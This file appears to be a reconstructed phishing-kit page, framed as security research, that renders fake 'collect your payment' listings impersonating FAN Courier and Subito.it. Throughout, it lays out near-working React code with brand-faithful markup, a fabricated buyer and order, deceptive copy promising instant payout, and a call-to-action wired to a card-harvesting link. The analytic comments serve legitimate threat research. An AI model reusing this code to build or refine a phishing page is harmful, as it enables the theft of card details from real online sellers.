/**
 * helpdeskPage.js — RECONSTRUCTED (technical analysis for security research)
 * =============================================================================
 * Victim-facing FAKE "you have a sale, collect your money" listing page.
 *
 * Phishing kit: minified Next.js 16.2.7 production bundle (Turbopack chunks).
 * This file reconstructs the per-brand "personalised fake-listing" page that is
 * served at a URL shaped like:  /helpdesk/<adId>/<brand>
 *
 * Two concrete brand renderers were recovered from the assigned source chunks:
 *   - FAN Courier (Romanian courier)   -> kit-source/decompressed/39539e7245...js.txt
 *   - Subito.it    (Italian classifieds)-> kit-source/decompressed/3d6f43bdae97...js.txt
 *
 * Both share the SAME social-engineering structure, only the "skin" differs:
 *   product image + title + price, a fabricated buyer name / delivery address /
 *   order id, a "receive funds" / "confirm sale" CTA that links to the credential/
 *   card-harvesting Stripe step, a fake "buyer/secure payment protection" trust
 *   box, courier + card-brand logos, and a live-chat widget mount.
 *
 * The CTA (`paymentLink` / `makeLink("stripe")`) is the hook: it sends the victim
 * (a real seller who listed a real item) to a fake card-entry "to receive your
 * payout" page. There is no buyer and no payout — it harvests the seller's card.
 *
 * Original minified identifiers are renamed; literal asset paths, CSS class
 * strings and ALL Italian/Romanian copy are preserved verbatim (translations in
 * comments). Items inferred from context are marked // RECONSTRUCTED-APPROX.
 *
 * DO NOT DEPLOY. Reconstructed for evidence/attribution only.
 */

import React from "react";
import { jsx, jsxs, Fragment } from "react/jsx-runtime"; // original: e.i(731353)
import { Global, css } from "@emotion/react";           // original: e.i(739652) — injects per-brand CSS
import NextImage from "next/image";                       // original: e.i(608824) — <Image> wrapper (s.default)
import SubmitButton from "./_submitButton";               // original: e.i(15432) (r/y.default) — the CTA <a>/<button>
import { useButtonSubmit } from "./brandSkins";           // original: a.useButtonSubmit — builds the harvest link
import { SubitoModeConfig } from "./brandSkins";           // original: n (e.i(67256)) — Subito sub-brand skins

/* =============================================================================
 * orderData — the per-victim model both renderers consume.
 * Built in the page's default export (see buildFanCourierOrderData below). All
 * fields except `t` (the i18n translator) come from the server-injected `ad`.
 * =============================================================================
 *   t                : (key) => string         translation function
 *   paymentLink       : string                  harvest URL = makeLink("stripe")
 *   orderNumber       : "ORD-0001-234"-style fabricated id
 *   buyerName         : ad.fields.buyer_name    FAKE buyer the victim "sold" to
 *   productName       : ad.name                 the victim's real listing title
 *   productImage      : ad.images[0].url        the victim's real product photo
 *   price             : ad.product_price_formatted
 *   currency          : ad.country.currency.symbol (fallback "$")
 *   countryName       : ad.country.names.en
 *   formattedPrice    : `${price} ${currency}`
 *   deliveryMethod    : t("delivery.method_standard")
 *   deliveryAddress   : ad.fields.delivery_address  FAKE buyer address
 */

/* -----------------------------------------------------------------------------
 * FAN COURIER renderer (chunk 39539e7245..., module 917629)
 * Brand: FAN Courier RO. Assets under /static/fancourier/...  ("museo-sans" font)
 * -------------------------------------------------------------------------- */

// --- The core fake "order detail / collect payment" panel (minified: `k`) -----
const FanCourierOrderDetail = ({ orderData }) => {
  // Two date fields, both = today, formatted ro-RO. ("payment" = order date.)
  const dates = {
    payment: new Date().toLocaleDateString("ro-RO"),
    paymentCurrent: new Date().toLocaleDateString("ro-RO"),
  };

  if (!orderData.t) return null; // renders nothing until i18n is ready

  return (
    <div className="scroll-mt-0 md:scroll-mt-[110px] max-w-[1320px] px-4 sm:px-6 lg:px-8">
      <div className="text-gray-900 w-full">
        <div className="mt-4">

          {/* ---- 4-step progress strip: pay product / pay funds / ship / receive ---- */}
          {/* Romanian labels, translations in comments */}
          <div className="grid grid-cols-2 lg:grid-cols-4 gap-3 sm:gap-4 lg:gap-6 mb-4 sm:mb-6">
            <ProgressCard
              icon="/static/fancourier/media/pay.svg"
              label="Plata produsului"  /* "Payment for the product" */
              sub={dates.payment}
            />
            <ProgressCard
              highlighted
              icon="/static/fancourier/media/marketing.svg"
              label="Plata fondurilor"  /* "Payment of the funds" — the bait step */
              sub={dates.paymentCurrent}
            />
            <ProgressCard icon="/static/fancourier/media/icon-6.svg" label="Expediere" /* "Shipping" */ />
            <ProgressCard icon="/static/fancourier/media/icon-8.svg" label="Primirea produsului" /* "Receiving the product" */ />
          </div>

          {/* ===================== MOBILE layout (md:hidden) ===================== */}

          {/* ---- "Detalii expediție" (Shipment details) card — the fake order ---- */}
          <div className="w-full mb-4 sm:mb-6 md:hidden">
            <ShipmentDetailsCard orderData={orderData} dates={dates} compact />
          </div>

          {/* ---- "Colectează plata" (Collect the payment) CTA card ------------- */}
          <CollectPaymentCard orderData={orderData} compact />

          {/* ===================== DESKTOP layout (hidden md:flex) ============== */}
          <div className="hidden md:flex flex-wrap justify-end -mt-6 -mx-3">
            <div className="shrink-0 max-w-full w-full mt-6 px-3 md:w-6/12">
              <ShipmentDetailsCard orderData={orderData} dates={dates} />
            </div>
            <div className="shrink-0 max-w-full w-full mt-6 px-3 md:w-6/12 fancourier-museo">
              <CollectPaymentCard orderData={orderData} />
            </div>
          </div>

        </div>
      </div>
    </div>
  );
};

// One of the 4 progress steps. `highlighted` = the blue gradient "funds" step.
const ProgressCard = ({ icon, label, sub, highlighted }) => (
  <div
    className={
      highlighted
        ? // RECONSTRUCTED-APPROX: long Tailwind string collapsed for readability
          "relative text-white items-center bg-[linear-gradient(270deg,rgb(67,127,236),rgb(45,170,225)_100.01%)] shadow-[rgba(18,18,18,0.16)_0px_4px_8px_0px] flex flex-col h-full justify-between break-words border border-stone-300 px-3 sm:px-4 lg:px-8 py-3 sm:py-4 lg:py-7 rounded-lg border-solid"
        : "relative text-neutral-900 items-center bg-white shadow-[rgba(18,18,18,0.16)_0px_4px_8px_0px] flex flex-col h-full justify-between break-words border px-3 sm:px-4 lg:px-8 py-3 sm:py-4 lg:py-7 rounded-lg border-solid border-black/20"
    }
  >
    <NextImage src={icon} alt="Icon" width={82} height={69}
      className={highlighted ? "brightness-0 invert-[1] rotate-135" : ""} />
    <p className="break-words text-center">
      {label}
      {sub && <span className="block break-words text-[10px] sm:text-xs lg:text-sm">{sub}</span>}
    </p>
  </div>
);

// The fabricated "shipment details" / order summary (minified inline in `k`).
const ShipmentDetailsCard = ({ orderData, dates }) => (
  <div className="relative text-neutral-900 bg-white shadow-[rgba(18,18,18,0.16)_0px_4px_8px_0px] flex flex-col h-full break-words border px-8 py-7 rounded-lg border-solid border-black/20">
    <h2 className="text-slate-800 text-2xl font-bold items-center flex justify-start leading-[30px] break-words mb-2">
      <NextImage src="/static/fancourier/media/icon-9.svg" alt="Icon" width={49} height={51} className="mr-[7px]" />
      <span className="block break-words">Detalii expediție</span>{/* "Shipment details" */}
    </h2>
    {/* Each row: a label (RO) + a value pulled from the victim/fake-buyer model */}
    <DetailRow label="Număr ordine:"           value={orderData.orderNumber} />   {/* "Order number" */}
    <DetailRow label="Data ordine:"            value={dates.payment} />            {/* "Order date" */}
    <DetailRow label="Status ordine:"          value="Plată" />                    {/* "Order status" = "Payment" */}
    <DetailRow label="Numele cumpărătorului:"  value={orderData.buyerName} />       {/* "Buyer's name" (FAKE) */}
    <DetailRow label="Numele produsului:"      value={orderData.productName} />     {/* "Product name" */}
    <DetailRow label="Prețul produsului:"      value={orderData.formattedPrice} />  {/* "Product price" */}
    <DetailRow label="Adresa de livrare:"      value={orderData.deliveryAddress} last />{/* "Delivery address" (FAKE) */}
  </div>
);

const DetailRow = ({ label, value, last }) => (
  <p className={`break-words text-justify mb-2 py-2 flex gap-2 font-normal text-base${last ? "" : " border-b border-b-gray-200"}`}>
    <span className="break-words">{label}</span>
    <span className="break-words">{value}</span>
  </p>
);

// "Colectează plata" — the actual phishing CTA. Big price + "Primește banii".
const CollectPaymentCard = ({ orderData }) => (
  <div className="p-6 border-1 border-[#2EA5E2] rounded-lg shadow-lg bg-white text-center">
    <h2 className="text-2xl font-bold text-gray-800">Colectează plata</h2>{/* "Collect the payment" */}
    <span className="text-5xl font-extrabold text-[#2EA5E2] my-4">{orderData.formattedPrice}</span>
    {/* "The funds will be transferred to your card immediately." — the lie */}
    <p className="text-base text-gray-600 mb-6">Fondurile vor fi transferate pe cardul tău imediat.</p>
    <SubmitButton
      type="button"
      href={orderData.paymentLink} /* === makeLink("stripe") — card-harvest URL */
      className="bg-blue-400 w-full flex justify-center items-center gap-3 bg-[#DC0232] text-white py-3 px-4 rounded-full font-bold text-lg hover:bg-blue-500 transition-all duration-300 min-h-[60px] disabled:opacity-70 border-2 border-white"
    >
      <span className="n-button-text-wrapper flex items-center gap-2" data-button-content>
        {/* credit-card icon */}
        <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2">
          <path strokeLinecap="round" strokeLinejoin="round" d="M17 9V7a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2m2 4h10a2 2 0 002-2v-6a2 2 0 00-2-2H9a2 2 0 00-2 2v6a2 2 0 002 2zm7-5a2 2 0 11-4 0 2 2 0 014 0z" />
        </svg>
        Primește banii{/* "Receive the money" */}
      </span>
    </SubmitButton>
  </div>
);

// Wrappers `v`, `j` -> just centering containers around FanCourierOrderDetail.
const FanCourierMain = ({ orderData }) => (
  <main className="py-14 md:py-20 mx-auto justify-center flex flex-col max-w-[1320px]">
    <div className="w-full"><FanCourierOrderDetail orderData={orderData} /></div>
  </main>
);

/**
 * FanCourierPage — the page default export (chunk 39539e7245, module 917629).
 * Composes: <Header/> (g) + mobile <MobileNav/> (A) + <FanCourierMain/> (j) + <Footer/> (c).
 * Header / Footer / Nav are large static brand chrome (FAN Courier links, logos,
 * "ȘteFAN" support chat label) — omitted here; they live in brandSkins/footer chrome.
 *
 * NOTE on the live-chat widget mount: in the FAN Courier skin the "live chat" is
 * the floating "Discută cu ȘteFAN" ("Chat with ȘteFAN") support bubble rendered
 * by the footer column component (fixed bottom-right, /static/fancourier/media/
 * icon-19.svg). In the Subito skin the chat mount is the Stripe-themed support
 * flow. See LiveChatMount note in MODULE.md. // RECONSTRUCTED-APPROX
 */
export function FanCourierPage({ ad, serviceMethod, t }) {
  const { makeLink } = useButtonSubmit(serviceMethod, ad.tag);
  const orderData = buildFanCourierOrderData(ad, makeLink, serviceMethod, t);
  return (
    <Fragment>
      <Global styles={[fanCourierGlobalCss]} />
      <FanCourierShell orderData={orderData} />
    </Fragment>
  );
}

// Builds orderData (verbatim field mapping from minified module 917629).
function buildFanCourierOrderData(ad, makeLink, serviceMethod, t) {
  // Fabricated order id: ORD-<id/1000, 4 digits>-<id%1000, 3 digits>
  const orderNumber =
    `ORD-${Math.floor(ad.id / 1e3).toString().padStart(4, "0")}-` +
    `${(ad.id % 1e3).toString().padStart(3, "0")}`;
  return {
    t,
    paymentLink: makeLink("stripe"),            // <-- harvest URL
    orderNumber,
    buyerName: ad.fields.buyer_name,            // FAKE buyer
    productName: ad.name,                        // victim's real listing
    productImage: ad.images[0]?.url,
    price: ad.product_price_formatted,
    currency: ad.country.currency?.symbol || "$",
    countryName: ad.country.names.en,
    formattedPrice: `${ad.product_price_formatted} ${ad.country.currency?.symbol}`,
    deliveryMethod: t("delivery.method_standard"),
    deliveryAddress: ad.fields.delivery_address, // FAKE buyer address
    serviceMethod,
    ad,
  };
}

// FanCourierShell (minified `S`) — header + nav + main + footer. Chrome elided.
const FanCourierShell = ({ orderData }) => (
  <main className="text-neutral-900 bg-white block font-museo_sans">
    <div>
      {/* <FanCourierHeader/> (g) — sticky brand header */}
      {/* <FanCourierMobileNav/> (A) — hidden off-canvas mobile menu */}
      <FanCourierMain orderData={orderData} />
      {/* <FanCourierFooter/> (c) — dark footer with ANPC/ANSPDC logos + social */}
    </div>
  </main>
);


/* -----------------------------------------------------------------------------
 * SUBITO renderer (chunk 3d6f43bdae97..., module 853647)
 * Brand: Subito.it. Assets under /static/subito/...   Sub-brand skin via
 * SubitoModeConfig[ad.variables.mode] (motori/market/immobili/lavoro/default).
 *
 * This is the more complete reference renderer: it shows the SAME funnel but in
 * the Subito design system (CSS-module class names, --sbt-* design tokens).
 * -------------------------------------------------------------------------- */

export function SubitoPage({ ad, serviceMethod, t }) {
  const { makeLink } = useButtonSubmit(serviceMethod, ad.tag);

  // Price/currency for the ad-info price block:
  const price        = ad.product_price_formatted || ad.fields.price;
  const currency     = ad.country.currency?.symbol;
  const productName  = ad.name;
  const productImage = ad.images[0]?.url;
  const buyerName    = ad.fields.buyer_name;        // FAKE buyer
  const deliveryAddr = ad.fields.delivery_address;  // FAKE address
  const vars         = ad.variables;
  const deliveryPrice = ad.variables?.delivery_price || 0;

  // Delivery price formatted "12.34 €" with a try/catch fallback "0.00 €".
  let deliveryPriceFormatted;
  try {
    deliveryPriceFormatted = `${Number(deliveryPrice).toFixed(2)} ${ad.country.currency?.symbol}`;
  } catch {
    deliveryPriceFormatted = `0.00 ${ad.country.currency?.symbol || "€"}`;
  }

  // --- SUB-BRAND SKIN SELECTION (the heart of brandSkins.js) ---
  const mode      = SubitoModeConfig[vars?.mode] || SubitoModeConfig.default;
  const theme     = mode.theme;       // e.g. "theme-blueMotori hide-lira-b"
  const logo      = mode.logo;        // e.g. "/static/subito/brand/motori.svg"
  const logoClass = mode.logoClass;   // e.g. "motori-logo"
  const showDelivery = vars?.show_delivery; // toggles the fake shipping section

  return (
    <Fragment>
      <Global styles={[subitoGlobalCss]} />
      <div className={`bg-white ${theme}`}>
        <div id="content" data-id="content" className="grid12">
          <div id="__next">

            {/* ad-network skin/preroll placeholder divs preserved verbatim */}
            <SubitoAdSlots t={t} />

            <div id="layout" className={`layout_wrapper__MrTL1 ${theme}`}>
              <SubitoHeader logo={logo} logoClass={logoClass} t={t} />

              <main className="layout_main__E8fvu">
                <div className="SkeletonWithAdv_skeleton__yPdNQ">
                  {/* left skyscraper ad rail (lira-waiting placeholder) */}
                  <aside className="SkeletonWithAdv_left-aside__3qZ54">
                    <div className="SkeletonWithAdv_aside-wrapper___l3kv">
                      <div className="SkeletonWithAdv_aside-skyscraper__qkOrr">
                        <div id="adview-skyscraper-left" className="lira-waiting" />
                      </div>
                    </div>
                  </aside>

                  <div className="SkeletonWithAdv_main__CtrJ4">
                    <div className="container_outer-ad-container__carpF">
                      <div className="container_inner-ad-container__jkoED grid_detail-container__uSre9"
                           style={{ "--right-block-row-span": "5" }}>

                        {/* =========== AD-INFO / "collect funds" column =========== */}
                        <div className="grid_detail-component__Q9ihk grid_right-container__FUFmP">
                          <section className="general-info_general-info__PhJf8 grid_ad-info-container__f4cgk grid_ad-info-override__TzaFE">
                            <div className="general-info_ad-info__8rDpS">

                              {/* fabricated ad ID */}
                              <div className="AdInfo_ad-info__top-caption-wrapper__07Gxt">
                                <div className="AdInfo_ad-info__listing-info__gylza" />
                                <span className="caption book AdInfo_ad-info__id__j9gPZ">ID: {ad?.id}</span>
                              </div>

                              {/* ---- product preview: image + title + price ---- */}
                              <div className="AdInfo_preview__box" style={{ display: "flex", alignItems: "center", gap: "12px", margin: "8px 0 4px 0" }}>
                                <div className="AdInfo_preview__image" style={{ width: "64px", height: "64px", borderRadius: "8px", overflow: "hidden", border: "1px solid #e6ecf1", position: "relative", background: "#f8fafc", flexShrink: 0 }}>
                                  {productImage && (
                                    <NextImage src={productImage} alt={productName} width={200} height={200} quality={100} priority
                                      style={{ width: "100%", height: "100%", objectFit: "cover", display: "block" }}
                                      onError={(e) => { e.currentTarget.style.display = "none"; }} />
                                  )}
                                </div>
                                <div className="AdInfo_preview__texts" style={{ minWidth: 0 }}>
                                  <div className="mb-1">
                                    <span className="text-sm truncate! text-wrap text-gray-500 md:max-w-[200px]! block!">{productName}</span>
                                  </div>
                                  <div className="index-module_price-group__B9-pV">
                                    <p className="index-module_price__N7M2x AdInfo_price__flXgp index-module_large__SUacX">
                                      {/* ac-text markers are scraped/filled by the kit's parser */}
                                      <span ac-text="product-price-formatted">{price}</span>
                                      <span ac-text="product-currency">{currency}</span>
                                      {showDelivery && (
                                        <span className="caption book small index-module_badge__CJKW4 index-module_detail__zn-Ga shipping-badge index-module_badge__LFSGS index-module_themed__RzZ7w index-module_inverted__kiFh2">
                                          <svg width="16" height="12" xmlns="http://www.w3.org/2000/svg" className="index-module_truck__nqyOS index-module_detail-truck__-rhuC" aria-hidden="true">
                                            <path d="M5.5 7c.817 0 1.543.392 2 .999H9V2H7a1 1 0 01-.993-.883..." /* truck icon */ />
                                          </svg>
                                          {t("shipping_available")}
                                        </span>
                                      )}
                                    </p>
                                  </div>
                                </div>
                              </div>

                              {/* ---- "Payment on Subito" trust/info box ---- */}
                              <section className="InfoBox_infoBox__sCoad">
                                <section className="grid_detail-component__Q9ihk">
                                  <div className="PaymentMethods_payment-methods__0ZOcQ">
                                    <div className="PaymentMethods_payment-info__Qcxxb">
                                      <div className="PaymentMethods_subtitle-with-icon__bHoXa">
                                        <div className="PaymentMethods_icon-wrapper__i_Fh_">
                                          <svg viewBox="6 6 20 20" height="24" width="24" className="Icons_icon__Gk3he"><path d="M15.601 9.784a6.12..." /></svg>
                                        </div>
                                        <p className="body-text semibold">{t("payment_on_subito")}</p>
                                      </div>
                                      <p className="body-text small">
                                        {t("payment_info_text.first")}
                                        <strong>{t("payment_info_text.second")}</strong>
                                        {t("payment_info_text.third")}
                                      </p>
                                    </div>
                                  </div>
                                </section>
                              </section>

                              {/* ============ THE CTA: "receive funds" ============ */}
                              {/* href = makeLink("stripe") -> card/credential harvest */}
                              <div className="sticky-cta-top-anchor AdInfo_buyButton__PXech">
                                <SubmitButton
                                  className="button-text index-module_sbt-button__hQMUx index-module_solid__fVa0q index-module_large__Zhzux AdBuyButtons_buy-now-button__zsM_Z"
                                  href={makeLink("stripe")}
                                >
                                  {t("receive_funds_button")}
                                </SubmitButton>
                              </div>

                              {/* ---- Stripe-style trust box: buyer protection + secure payment + card logos ---- */}
                              <section className="InfoBox_infoBox__sCoad">
                                <div className="InfoBox_buyerProtection__UQ_re">
                                  <svg role="img" aria-hidden="true" width="16" height="16" viewBox="0 0 32 32"><g fill="currentColor"><path d="M15.9994 3C11.4995 7..." /><path d="m12 16 3 3 5-5" /></g></svg>
                                  <p className="body-text small">{t("buyer_protection")}</p>
                                </div>
                                <div className="InfoBox_paymentMethods__Y4WhN">
                                  <svg role="img" aria-hidden="true" width="16" height="16" viewBox="0 0 16 17"><g fill="currentColor"><path d="m11.332 6.804..." /></g></svg>
                                  <p className="body-text small">{t("secure_payment")}</p>
                                  <div className="InfoBox_icons__96k8A">
                                    {/* card-brand trust logos */}
                                    <NextImage src="/static/subito/media/mastercard.png" alt="Mastercard" width="20" height="21" />
                                    <NextImage src="/static/subito/media/visa.png"       alt="Visa"       width="26" height="21" />
                                    <NextImage src="/static/subito/media/paypal.png"     alt="PayPal"     width="30" height="21" />
                                  </div>
                                </div>
                              </section>

                              {/* "useful links" loan-calculator affiliate filler (real subito redirect) */}
                              <div className="AdInfo_useful-links-wrapper__L0zJd">
                                <div id="usefullinks_wrapper">
                                  <div className="UsefulLinks-module_container__8FAqg">
                                    <a target="_blank" rel="nofollow noreferrer"
                                       href="https://hades.subito.it/campaigns/redirect?campaign_id=671&params=&property=web"
                                       className="UsefulLinks-module_usefullink__aWZFw">
                                      {t("useful_links_calculate_loan")}
                                    </a>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </section>
                        </div>

                        {/* =========== fake SHIPPING / delivery section (showDelivery) =========== */}
                        {showDelivery && (
                          <SubitoShippingSection
                            t={t}
                            buyerName={buyerName}
                            deliveryPriceFormatted={deliveryPriceFormatted}
                            deliveryAddr={deliveryAddr}
                          />
                        )}

                        <div className="grid_detail-component__Q9ihk card-block" />

                        {/* ---- Subito + Polizia Postale "safety tips" trust strip ---- */}
                        <section className="grid_detail-component__Q9ihk safety-component">
                          <aside className="SafetyTips_safety-tips-wrapper__n4Nzd">
                            <div className="SafetyTips_safety-tips-icon__Ptl6E">
                              <NextImage src="/static/subito/media/lucchetto.svg" alt="Safety tips icon" width="32" height="32" />
                            </div>
                            <p>
                              <span className="caption">{t("safety_notice_prefix")}</span>
                              <span className="caption book">{t("safety_notice_text")}</span>
                              <a target="_blank" rel="noreferrer"
                                 href="https://assistenza.subito.it/hc/it/articles/360001165545-I-consigli-sicuri-di-Subito-con-Polizia-Postale?from=ad_detail"
                                 className="index-module_link__DRIj5 index-module_themed__YBCsG index-module_small__f1OvZ index-module_semibold__vFsrf">
                                <span className="caption book">{t("buy_safely")}</span>
                              </a>
                            </p>
                          </aside>
                        </section>

                      </div>
                    </div>
                  </div>
                </div>
              </main>

              {/* ---- footer: "© Subito.<cc> - P.IVA 05526340962" ---- */}
              <SubitoFooter countryCode={ad.country_code} />
            </div>
          </div>
        </div>
      </div>
    </Fragment>
  );
}

// Fake "home delivery" block: shows the FAKE buyer name, delivery price and
// FAKE address, "managed by Subito", and courier logos (Poste/UPS/InPost/BRT).
const SubitoShippingSection = ({ t, buyerName, deliveryPriceFormatted, deliveryAddr }) => (
  <section className="grid_detail-component__Q9ihk">
    <h2 className="headline-6">{t("delivery_methods_title")}</h2>
    <p className="body-text book small">{t("delivery_methods_subtitle")}</p>
    <div className="ShippingMethods_shipping-options__fY3Nb">
      <div className="ShippingMethods_shipping-cost-wrapper__cl_jp">
        <div className="ShippingMethods_icon-wrapper__d8EpZ">
          <svg viewBox="0 0 24 24" width="24" height="24" className="Icons_icon__DIU1B"><path d="m12.503 3.948..." /></svg>
        </div>
        <div className="ShippingMethods_shipping-cost__Y9xLV">
          <div className="ShippingMethods_name-and-price__giRX6">
            <p className="body-text semibold">{t("home_delivery")}</p>
          </div>
          <p className="caption book small ShippingMethods_shipping-text__41r3R">{t("home_delivery_text")}</p>
          {/* FAKE buyer full name */}
          <div className="body-text small" style={{ marginTop: "8px" }}>
            <span style={{ color: "#717e8f" }}>{t("full_name_label")}:</span>{" "}
            <span className="body-text semibold" ac-text="delivery-full-name">{buyerName}</span>
          </div>
          {/* delivery price (note: original reuses the delivery-full-name ac-text marker — bug preserved) */}
          <div className="body-text small" style={{ marginTop: "8px" }}>
            <span style={{ color: "#717e8f" }}>{t("delivery_price_label")}:</span>{" "}
            <span className="body-text semibold" ac-text="delivery-full-name">{deliveryPriceFormatted}</span>
          </div>
          {/* FAKE delivery address */}
          <div className="body-text small" style={{ marginTop: "4px" }}>
            <span style={{ color: "#717e8f" }}>{t("delivery_address_label")}:</span>{" "}
            <span className="body-text semibold" ac-text="delivery-address">{deliveryAddr}</span>
          </div>
        </div>
      </div>
    </div>
    <p className="overline book small ShippingMethods_shipping-type__Fs0LD">{t("shipping_managed_by_subito")}</p>
    {/* courier trust logos */}
    <div className="ShippingMethods_shipping-icons-container__Yc3es">
      <NextImage alt="Poste Italiane" loading="lazy" width="42" height="25" src="/static/subito/media/poste_italiane.svg" />
      <NextImage alt="UPS"            loading="lazy" width="42" height="25" src="/static/subito/media/ups.svg" />
      <NextImage alt="InPost"         loading="lazy" width="42" height="25" src="/static/subito/media/inpost.svg" />
      <NextImage alt="BRT"            loading="lazy" width="42" height="25" src="/static/subito/media/bartolini.svg" />
    </div>
  </section>
);

// Subito footer: "© Subito.<cc> - P.IVA 05526340962" + grey logo.
const SubitoFooter = ({ countryCode }) => (
  <div data-google-interstitial="false">
    <footer className="index-module_footer-wrapper__yvt-f">
      <div className="index-module_footer-bottom__Lg88q">
        <NextImage className="index-module_logo__iPgAH" src="/static/subito/media/grey-short.svg" width={136} height={32} alt="Subito logo" crossOrigin="anonymous" loading="lazy" />
        <p className="body-text small index-module_footer-info__ARO6n">
          © Subito.{countryCode.toLowerCase()} - P.IVA 05526340962
        </p>
      </div>
    </footer>
  </div>
);

/**
 * SubitoAdSlots — preserved verbatim ad-network placeholder DOM. These mimic
 * Subito's real ad slots (apn_skin_tag / apnx_preroll) so the fake page looks
 * authentic. Includes a hidden CSS hack that hides the real ad skin.
 */
const SubitoAdSlots = ({ t }) => (
  <Fragment>
    <style>{`#skinadvtop2~body #apn_skin_tag { height: 0 !important; }`}</style>
    <div id="apn_skin_tag" className="lira-waiting" style={{ maxHeight: "122px", position: "sticky", textAlign: "center", top: 0, height: 0 }} />
    <div id="apnx_preroll_wrapper" style={{ position: "fixed", bottom: 0, right: 0, zIndex: 1 }}>
      <div id="apnx_preroll" style={{ display: "none", width: "400px", marginRight: "20px", marginBottom: "73px", textAlign: "end", backgroundColor: "#fff" }} />
      <div id="apnx_preroll_close_button" style={{ position: "absolute", top: "4px", right: "25px", width: "35px", height: "20px", zIndex: 2, display: "none", fontSize: "12px", cursor: "pointer" }}>
        {t("close")}
      </div>
    </div>
  </Fragment>
);

/**
 * SubitoHeader — the brand header. Includes the red "stars" sticky promo banner
 * (uses theme-redCorporate — a FIXED marketing banner class, independent of the
 * SubitoModeConfig sub-brand theme), the top nav links to real subito.it pages,
 * and the brand logo (the sub-brand `logo`/`logoClass` chosen above).
 * Clicking the logo just reloads (no real navigation). Chrome elided for brevity.
 */
const SubitoHeader = ({ logo, logoClass /*, t */ }) => (
  <header className="index-module_header-wrapper__DdDr3">
    {/* ...red theme-redCorporate "stars" sticky banner + top-link nav (verbatim
        links to subito.it magazine / per-i-privati / impresapiu / aziende /
        assistenza / areariservata) ... */}
    <div className="index-module_header__r5EmJ">
      <a onClick={() => window.location.reload()} title="Subito.it" aria-label="Torna alla pagina principale">
        <NextImage src={logo} width={230} height={36} alt="Subito logo" className={logoClass} crossOrigin="anonymous" />
      </a>
    </div>
  </header>
);

/* =============================================================================
 * Per-brand CSS blobs (emotion css``). Full text preserved in the raw chunks;
 * truncated here. fanCourierGlobalCss embeds the "museo-sans" typekit @font-face
 * set; subitoGlobalCss embeds the --sbt-* design tokens + the VideoJS @font-face.
 * ========================================================================== */
const fanCourierGlobalCss = css`/* RECONSTRUCTED-APPROX: see chunk 39539e7245 var C — museo-sans typekit + shadcn :root vars */`;
const subitoGlobalCss     = css`/* RECONSTRUCTED-APPROX: see chunk 3d6f43bdae97 var s — Subito grid + --sbt-* tokens */`;

export default { FanCourierPage, SubitoPage };
